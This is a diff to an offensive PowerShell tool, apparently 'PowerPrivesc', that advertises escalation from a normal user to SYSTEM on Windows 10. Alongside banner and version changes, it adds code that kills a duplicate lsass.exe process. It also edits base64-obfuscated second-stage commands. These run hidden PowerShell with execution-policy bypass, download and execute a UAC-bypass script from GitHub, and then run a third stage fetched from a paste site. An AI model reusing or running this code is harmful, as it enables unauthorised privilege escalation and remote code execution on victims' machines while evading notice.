@@ -13,7 +13,7 @@ This script itself is also "Clean"
 THIS SCRIPT ONLY SUPPORT WINDOWS 10!!!
 Can go up to SYSTEM from normal user
 Author: GetRektBoy724
-Version : v1.0.1
+Version : v1.1.0
 Required Dependencies: None  
 Optional Dependencies: None  
 .DESCRIPTION
@@ -50,18 +50,15 @@ Param(
 )
 #good tool needs a good banner
 $banner = @"
-'########:::'#######::'##:::::'##:'########:'########::'########::'########::'####:'##::::'##:'########::'######:::'######::
- ##.... ##:'##.... ##: ##:'##: ##: ##.....:: ##.... ##: ##.... ##: ##.... ##:. ##:: ##:::: ##: ##.....::'##... ##:'##... ##:
- ##:::: ##: ##:::: ##: ##: ##: ##: ##::::::: ##:::: ##: ##:::: ##: ##:::: ##:: ##:: ##:::: ##: ##::::::: ##:::..:: ##:::..::
- ########:: ##:::: ##: ##: ##: ##: ######::: ########:: ########:: ########::: ##:: ##:::: ##: ######:::. ######:: ##:::::::
- ##.....::: ##:::: ##: ##: ##: ##: ##...:::: ##.. ##::: ##.....::: ##.. ##:::: ##::. ##:: ##:: ##...:::::..... ##: ##:::::::
- ##:::::::: ##:::: ##: ##: ##: ##: ##::::::: ##::. ##:: ##:::::::: ##::. ##::: ##:::. ## ##::: ##:::::::'##::: ##: ##::: ##:
- ##::::::::. #######::. ###. ###:: ########: ##:::. ##: ##:::::::: ##:::. ##:'####:::. ###:::: ########:. ######::. ######::
-..::::::::::.......::::...::...:::........::..:::::..::..:::::::::..:::::..::....:::::...:::::........:::......::::......:::
-----------------------------------------------------------------------------------------------------------------------------
-                               [----Your All-In-One Powershell Privilege Escalation Tool----]                                       
-                               [--------------Built With Love By GetRektBoy724--------------]
-                               [--------------https://github.com/GetRektBoy724--------------]
+ ____                        ____       _                     
+|  _ \ _____      _____ _ __|  _ \ _ __(_)_   _____  ___  ___ 
+| |_) / _ \ \ /\ / / _ \ '__| |_) | '__| \ \ / / _ \/ __|/ __|
+|  __/ (_) \ V  V /  __/ |  |  __/| |  | |\ V /  __/\__ \ (__ 
+|_|   \___/ \_/\_/ \___|_|  |_|   |_|  |_| \_/ \___||___/\___|
+--------------------------------------------------------------
+[----Your All-In-One Powershell Privilege Escalation Tool----]                                       
+[--------------Built With Love By GetRektBoy724--------------]
+[--------------https://github.com/GetRektBoy724--------------]
 "@
 Write-Host $banner
 #check windows build number
@@ -106,6 +103,13 @@ If ($HTTP_Status -ne 200) {
     $HTTP_Response.Close()
 }
 Start-Sleep 1
+#check if there is multiple lsass.exe
+Write-Host "Checking If There Is Any lsass.exe Duplicate Process ..."
+$lsassprocess = @(get-process -ea silentlycontinue lsass)
+if ($lsassprocess.Count -gt 1) {
+    Write-Host "lsass.exe Duplicate Process Detected,Killing it..."
+    kill $lsassprocess.Id[1]
+}
 function UserToSYSTEM {
 #craft the last stage and upload to paste.c-net.org
 if ($HideWindow) {
@@ -119,7 +123,7 @@ $upload = Invoke-WebRequest -Uri http://paste.c-net.org/ -Method Post -Body $las
 $stage3link = ((Select-String '(http[s]?)(:\/\/)([^\s,]+)(?=")' -Input $upload.Content).Matches.Value)
 #craft the second stage and reverse it for obfuscation
 if ($HideWindow) {
-$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLVcgaGlkZGVuIC1ub3AgLWVwIGJ5cGFzcyAtQ29tbWFuZCAiJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL1VBQ0JTdGFydHVwLnBzMSAtVXNlQmFzaWNQYXJzaW5nO0ludm9rZS1FeHByZXNzaW9uICRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnc3RhZ2UzbGluaycpOyI="
+$rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLW5vcCAtVyBoaWRkZW4gLWVwIGJ5cGFzcyAtQ29tbWFuZCAiJGFjY2Vzc3N0YXJ0dXAgPSBJbnZva2UtV2ViUmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vR2V0UmVrdEJveTcyNC9zZW1lbnRhcmEvbWFzdGVyL1VBQ0JTdGFydHVwLnBzMSAtVXNlQmFzaWNQYXJzaW5nO0ludm9rZS1FeHByZXNzaW9uICRhY2Nlc3NzdGFydHVwLkNvbnRlbnQ7SW52b2tlLUV4cHJlc3Npb24oTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnc3RhZ2UzbGluaycpOyI="
 } else {
 $rawbase64secondstage = "cG93ZXJzaGVsbC5leGUgLW5vcCAtZXAgYnlwYXNzIC1Db21tYW5kICIkYWNjZXNzc3RhcnR1cCA9IEludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HZXRSZWt0Qm95NzI0L3NlbWVudGFyYS9tYXN0ZXIvVUFDQlN0YXJ0dXAucHMxIC1Vc2VCYXNpY1BhcnNpbmc7SW52b2tlLUV4cHJlc3Npb24gJGFjY2Vzc3N0YXJ0dXAuQ29udGVudDtJbnZva2UtRXhwcmVzc2lvbihOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdzdGFnZTNsaW5rJyk7Ig=="
 }
